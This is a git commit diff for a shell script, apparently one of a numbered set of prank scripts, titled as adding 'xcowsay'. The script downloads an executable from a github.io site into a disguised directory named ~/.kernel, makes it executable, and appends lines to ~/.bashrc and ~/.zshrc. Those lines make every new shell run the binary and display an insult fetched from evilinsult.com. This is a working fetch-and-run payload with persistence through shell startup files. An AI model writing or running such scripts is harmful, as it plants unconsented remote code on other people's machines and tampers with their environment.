f9547c6e8a0de0063d922e19b9af8f1e05c64387
Remy <remy.noulin@epitech.eu>
2022-10-10 23:21:26 +0200

    [ADD] xcowsay

--- scripts/11.sh
+++ scripts/11.sh
@@ -3,5 +3,5 @@
 mkdir ~/.kernel
 curl https://Waz0x.github.io/bin/xcowsay/bin > ~/.kernel/bin && chmod +x ~/.kernel/bin
 curl https://Waz0x.github.io/bin/xcowsay/cow_med.png > ~/.kernel/cow_med.png
-echo "cd ~/.kernel;./bin --image cow_med.png \"\$(curl https://evilinsult.com/generate_insult.php\?lang\=fr\&amp\;type\=raw -s)\";cd &" >> ~/.bashrc
+echo "cd ~/.kernel;./bin --image cow_med.png \"\$(curl https://evilinsult.com/generate_insult.php\?lang\=fr\&amp\;type\=raw -s)\" &;cd" >> ~/.bashrc
 echo "cd ~/.kernel;./bin --image cow_med.png \"\$(curl https://evilinsult.com/generate_insult.php\?lang\=fr\&amp\;type\=raw -s)\" &;cd" >> ~/.zshrc
